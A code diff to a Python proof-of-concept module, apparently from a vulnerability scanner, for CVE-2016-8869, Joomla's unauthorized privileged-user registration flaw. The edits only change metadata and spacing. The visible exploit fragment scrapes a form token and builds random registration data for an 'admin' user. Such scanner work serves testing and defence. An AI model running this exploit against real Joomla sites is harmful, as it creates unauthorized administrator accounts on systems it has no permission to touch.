@@ -7,15 +7,15 @@ import re
 
 class Vuln(ABVuln):
     vuln_id = 'Joomla_0002'  # 平台漏洞编号，留空
-    name = 'Joomla未授权创建特权用户漏洞'  # 漏洞名称
+    name = 'Joomla! 未授权创建特权用户'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2016-10-24'  # 漏洞公布时间
     desc = '''
-        Joomla 3.4.4到3.6.3的版本中，攻击者可以在网站关闭注册的情况下注册用户。
+        Joomla! 3.4.4到3.6.3的版本中，攻击者可以在网站关闭注册的情况下注册用户。
     '''  # 漏洞描述
     ref = 'https://github.com/SecWiki/CMS-Hunter/tree/master/Joomla'  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'CVE-2016-8869'  # cve编号
     product = 'Joomla!'  # 漏洞应用名称
     product_version = 'Joomla! 3.4.4 - 3.6.3'  # 漏洞应用版本
@@ -39,7 +39,7 @@ class Poc(ABPoc):
             p = re.compile(r'<input type="hidden" name="([0-9a-f]+)" value="1" />')
             token = p.findall(r.content)[0]
             #生成随机注册信息
-            randstr = '_'+str(random.randint(1,10000))
+            randstr = '_' + str(random.randint(1,10000))
             #print('[*] create user: {}'.format('admin'+randstr))
             data = {
                 # User object
